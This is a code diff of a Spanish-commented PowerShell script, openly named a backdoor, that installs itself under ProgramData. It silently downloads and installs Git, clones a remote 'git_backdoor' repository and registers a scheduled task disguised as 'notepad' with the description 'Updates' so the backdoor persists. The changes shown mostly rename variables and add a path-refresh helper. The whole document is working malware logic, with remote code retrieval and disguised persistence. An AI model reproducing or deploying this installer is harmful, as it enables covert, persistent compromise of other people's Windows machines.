@@ -1,18 +1,19 @@
 # Configuración
 $location_root = $env:ProgramData
-$program_name = "backdoor_program" # Se creara una carpeta con este nombre
+$folder_name = "backdoor_program" # Se creara una carpeta con este nombre
 $program_to_execute = "main.ps1" # Programa a ejecutar
 $git_origin = "https://github.com/elcaza/git_backdoor.git"
 # End Configuración
 
 
 $is_git_ready=$false
-$program_location = $location_root+"\"+$program_name+"\windows\"
+$program_git_location = $location_root+"\"+$folder_name
+$program_location = $location_root+"\"+$folder_name+"\windows\"
 $git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.windows.1/Git-2.24.0-64-bit.exe"
 
 
 # Corroboramos si git está instalado
-function check_git {
+function is_git_installed {
 	try {
 		git | Out-Null
 		"Git is installed"
@@ -26,7 +27,7 @@ function check_git {
 function download_git {
 	$job = Start-Job { 
 		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
-		Set-Location $using:program_location
+		Set-Location $using:program_git_location
 		function download_git {
 			"Descargando git..."
 			Invoke-WebRequest -Uri $using:git_client -OutFile ".\git.exe"
@@ -41,7 +42,7 @@ function download_git {
 # Instalamos git
 function install_git {
 	"Instalando git"
-	Set-Location $program_location
+	Set-Location $program_git_location
 	try {
 		Start-Process "git.exe" -argumentlist "/VERYSILENT /passive /norestart" -wait
 	} catch {
@@ -102,14 +103,20 @@ function load_backdoor {
 	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
 }
 
+function refresh_path {
+	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
+		";" +
+		[System.Environment]::GetEnvironmentVariable("Path","User")
+}
+
 function start_program{
 	# Si git no está instalado
-	if( !(check_git) ) {
+	if( !(is_git_installed) ) {
 		"Creando ubicaciones"
 		# Creando ubicaciones
 		Set-Location $location_root
-		mkdir $program_name
-		Set-Location $program_name 
+		mkdir $folder_name
+		Set-Location $folder_name 
 
 		"Descargando git"
 		# Descargamos git
@@ -127,11 +134,11 @@ function start_program{
 
 			"Actualiznado variables"
 			# Actualizamos nuestra variables de entorno
-			$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") 
 
-			if(check_git) {
-				$is_git_ready=$true
-			}
+			# if(is_git_installed) {
+			# 	$is_git_ready=$true
+			# }
+			refresh_path
 			
 			if ( $contador -ge 10 ){
 				$is_git_ready=$true
@@ -141,6 +148,12 @@ function start_program{
 			Start-Sleep -s 5
 		}
 	}
+
+	if( !(is_git_installed) ) {
+		exit
+	}
+
+	
 	
 	#Download repo
 	download_backdoor
